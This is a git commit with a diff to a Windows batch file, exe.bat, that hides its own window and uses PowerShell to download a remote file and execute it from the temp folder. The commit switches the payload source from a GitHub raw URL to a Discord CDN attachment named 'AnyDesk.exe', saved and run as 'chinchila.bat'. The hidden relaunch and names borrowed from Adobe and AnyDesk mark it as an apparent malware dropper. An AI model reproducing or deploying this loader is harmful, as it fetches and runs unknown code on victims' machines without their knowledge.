c2523fd0af4b5b7bb8672bd3384be791d596b18f
LilGorrillo <peruanoblindado@gmail.com>
2025-02-02 00:40:26 -0600

    Update exe.bat

--- exe.bat
+++ exe.bat
@@ -3,4 +3,4 @@ if "%1" == "hidden" goto :run
 start /min cmd /c "%~f0" hidden & exit
 :run
 
-powershell.exe -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/9pressure9x19/lodiablo/refs/heads/main/test.bat' -OutFile \"%TEMP%\AdobeScheduler.bat\"; Start-Process \"%TEMP%\AdobeScheduler.bat\""
+powershell.exe -Command "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1328831724762697879/1335488745780023367/AnyDesk.exe?ex=67a05a51&is=679f08d1&hm=61f1be0ea841bd713791f6a0a4968120b7cf823e4093ddaf46a943d0747b2596&' -OutFile \"%TEMP%\chinchila.bat\"; Start-Process \"%TEMP%\chinchila.bat\""
